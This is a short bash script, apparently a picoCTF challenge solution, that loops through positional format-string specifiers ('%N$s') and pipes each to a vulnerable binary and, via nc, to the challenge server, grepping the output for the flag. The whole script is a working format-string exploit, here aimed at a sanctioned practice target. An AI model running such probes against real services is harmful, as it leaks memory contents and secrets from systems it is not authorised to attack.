#!/bin/bash
#for i in {0..64}; do echo "%$i\$s" | ./vuln | grep SUCCESS; done
for i in {0..256}; do echo "%$i\$s" | nc saturn.picoctf.net 59111 | grep CTF; done
